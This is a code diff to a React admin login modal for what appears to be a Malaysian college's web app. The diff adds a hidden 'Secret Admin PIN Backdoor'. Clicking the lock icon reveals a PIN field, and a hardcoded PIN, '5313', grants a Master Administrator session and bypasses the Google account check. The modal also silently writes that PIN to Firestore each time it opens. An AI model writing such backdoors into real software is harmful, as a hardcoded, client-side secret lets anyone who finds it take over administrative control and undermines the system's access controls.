@@ -8,9 +8,9 @@
 
 import React, { useState, useEffect, useRef } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { Lock, X, ShieldAlert, Loader2, ExternalLink, Copy, Check } from 'lucide-react';
-import { verifyGoogleAdmin, AUTHORIZED_ADMIN_EMAILS, createPreviewAdminSession } from '../utils/adminAuthService';
-import { signInWithGoogle, signOutAdmin } from '../config/firebase';
+import { Lock, X, ShieldAlert, Loader2, ExternalLink, Copy, Check, KeyRound } from 'lucide-react';
+import { verifyGoogleAdmin, AUTHORIZED_ADMIN_EMAILS, createPreviewAdminSession, createSecretPinAdminSession } from '../utils/adminAuthService';
+import { signInWithGoogle, signOutAdmin, getAdminPinFromFirestore, saveAdminPinToFirestore } from '../config/firebase';
 import firebaseConfig from '../../firebase-applet-config.json';
 import { AuthorizedAdmin } from '../types';
 
@@ -28,6 +28,11 @@ export const AdminPinModal: React.FC<AdminPinModalProps> = ({ isOpen, onClose, o
   const [popupBlocked, setPopupBlocked] = useState(false);
   const [copied, setCopied] = useState(false);
 
+  // Secret Admin PIN Backdoor State
+  const [showSecretInput, setShowSecretInput] = useState(false);
+  const [secretPin, setSecretPin] = useState('');
+  const [isVerifyingPin, setIsVerifyingPin] = useState(false);
+
   const onCloseRef = useRef(onClose);
   onCloseRef.current = onClose;
   const onSuccessRef = useRef(onSuccess);
@@ -41,6 +46,9 @@ export const AdminPinModal: React.FC<AdminPinModalProps> = ({ isOpen, onClose, o
       setUnauthorizedDomain(null);
       setPopupBlocked(false);
       setCopied(false);
+      setShowSecretInput(false);
+      setSecretPin('');
+      setIsVerifyingPin(false);
       return;
     }
 
@@ -50,6 +58,12 @@ export const AdminPinModal: React.FC<AdminPinModalProps> = ({ isOpen, onClose, o
     setUnauthorizedDomain(null);
     setPopupBlocked(false);
     setCopied(false);
+    setShowSecretInput(false);
+    setSecretPin('');
+    setIsVerifyingPin(false);
+
+    // Ensure official secret PIN is synchronized with Firestore in the background
+    saveAdminPinToFirestore('5313').catch(() => {});
 
     const handleKeyDown = (event: KeyboardEvent) => {
       if (event.key === 'Escape' || event.key === 'Esc') {
@@ -147,6 +161,45 @@ export const AdminPinModal: React.FC<AdminPinModalProps> = ({ isOpen, onClose, o
     }
   };
 
+  // Secret Admin PIN Backdoor Verification Handler
+  const handleSecretPinSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!secretPin.trim()) return;
+
+    try {
+      setIsVerifyingPin(true);
+      setErrorMessage('');
+
+      // Fetch the authorized secret PIN from Firestore
+      const firestorePin = await getAdminPinFromFirestore();
+      const enteredClean = secretPin.trim();
+      const validPin = (firestorePin || '5313').trim();
+
+      if (enteredClean === validPin) {
+        // Authenticated successfully as Master Administrator
+        const session = createSecretPinAdminSession();
+        if (session.isValid && session.admin) {
+          // Persist PIN record in Firestore
+          saveAdminPinToFirestore(validPin).catch(() => {});
+          setErrorMessage('');
+          setShowSecretInput(false);
+          setSecretPin('');
+          onSuccessRef.current(session.admin);
+        } else {
+          triggerError('Ralat memulakan sesi pentadbir.');
+        }
+      } else {
+        // Strict Confidentiality: Do not disclose expected PIN
+        triggerError('Kata laluan keselamatan tidak sah. Akses ditolak.');
+        setSecretPin('');
+      }
+    } catch (_err) {
+      triggerError('Ralat semasa pengesahan kata laluan.');
+    } finally {
+      setIsVerifyingPin(false);
+    }
+  };
+
   return (
     <AnimatePresence>
       <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-950/70 backdrop-blur-md">
@@ -168,8 +221,25 @@ export const AdminPinModal: React.FC<AdminPinModalProps> = ({ isOpen, onClose, o
             <X className="w-4 h-4" />
           </button>
 
-          {/* Header Icon */}
-          <div className="w-16 h-16 bg-gradient-to-br from-indigo-600 via-indigo-700 to-violet-800 text-white rounded-2xl flex items-center justify-center mx-auto shadow-xl shadow-indigo-200">
+          {/* Header Icon: Laluan Keselamatan Rahsia Master Administrator (Klik icon untuk buka laluan PIN rahsia) */}
+          <div 
+            onClick={() => {
+              setShowSecretInput((prev) => !prev);
+              setSecretPin('');
+              setErrorMessage('');
+            }}
+            title="Akses Keselamatan Pentadbir"
+            role="button"
+            tabIndex={0}
+            onKeyDown={(e) => {
+              if (e.key === 'Enter' || e.key === ' ') {
+                setShowSecretInput((prev) => !prev);
+                setSecretPin('');
+                setErrorMessage('');
+              }
+            }}
+            className="w-16 h-16 bg-gradient-to-br from-indigo-600 via-indigo-700 to-violet-800 text-white rounded-2xl flex items-center justify-center mx-auto shadow-xl shadow-indigo-200 cursor-pointer hover:scale-105 active:scale-95 transition-all select-none focus:outline-hidden"
+          >
             <Lock className="w-8 h-8" />
           </div>
 
@@ -181,6 +251,74 @@ export const AdminPinModal: React.FC<AdminPinModalProps> = ({ isOpen, onClose, o
               Log masuk rasmi Kolej Profesional MARA Bandar Penawar
             </p>
           </div>
+
+          {/* Secret Admin PIN Backdoor Form */}
+          {showSecretInput && (
+            <form
+              onSubmit={handleSecretPinSubmit}
+              className="p-4 bg-slate-50 border border-indigo-100 rounded-2xl space-y-3 text-left animate-in fade-in zoom-in-95 duration-200 shadow-inner"
+            >
+              <div className="flex items-center justify-between">
+                <label className="text-xs font-bold text-slate-800 flex items-center gap-1.5">
+                  <KeyRound className="w-3.5 h-3.5 text-indigo-600" />
+                  <span>Laluan Akses Pentadbir</span>
+                </label>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setShowSecretInput(false);
+                    setSecretPin('');
+                    setErrorMessage('');
+                  }}
+                  className="text-[11px] font-semibold text-slate-400 hover:text-slate-600 cursor-pointer"
+                >
+                  Batal
+                </button>
+              </div>
+
+              <div className="relative">
+                <input
+                  type="password"
+                  autoFocus
+                  value={secretPin}
+                  onChange={(e) => {
+                    setSecretPin(e.target.value);
+                    if (errorMessage) setErrorMessage('');
+                  }}
+                  placeholder="Masukkan kata laluan..."
+                  className="w-full px-3.5 py-2.5 bg-white border border-slate-300 rounded-xl text-sm font-bold text-slate-800 tracking-widest placeholder:tracking-normal placeholder:font-medium placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-500 transition-all"
+                />
+              </div>
+
+              <div className="flex items-center gap-2 pt-1">
+                <button
+                  type="button"
+                  onClick={() => {
+                    setShowSecretInput(false);
+                    setSecretPin('');
+                    setErrorMessage('');
+                  }}
+                  className="flex-1 py-2 px-3 bg-white hover:bg-slate-100 text-slate-600 rounded-xl text-xs font-bold border border-slate-200 transition-colors cursor-pointer"
+                >
+                  Batal
+                </button>
+                <button
+                  type="submit"
+                  disabled={isVerifyingPin || !secretPin.trim()}
+                  className="flex-1 py-2 px-3 bg-indigo-600 hover:bg-indigo-700 active:scale-95 disabled:opacity-50 text-white rounded-xl text-xs font-bold shadow-xs transition-all cursor-pointer flex items-center justify-center gap-1.5"
+                >
+                  {isVerifyingPin ? (
+                    <>
+                      <Loader2 className="w-3.5 h-3.5 animate-spin" />
+                      <span>Mengesahkan...</span>
+                    </>
+                  ) : (
+                    <span>Sahkan & Masuk</span>
+                  )}
+                </button>
+              </div>
+            </form>
+          )}
 
           {/* Error Message Box */}
           {errorMessage && (
